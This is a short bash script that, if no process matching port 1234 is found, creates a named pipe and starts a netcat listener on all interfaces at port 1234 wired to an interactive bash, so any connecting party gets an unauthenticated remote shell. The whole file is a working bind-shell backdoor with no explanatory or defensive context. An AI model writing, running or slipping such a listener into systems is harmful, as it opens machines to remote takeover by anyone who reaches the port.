#!/bin/bash

n=$(ps aux | grep -o [1]234)

if [[ $n = "" ]]; then
    mkfifo f
    nc -l 0.0.0.0 1234 < f | /bin/bash -i > f 2>&1
fi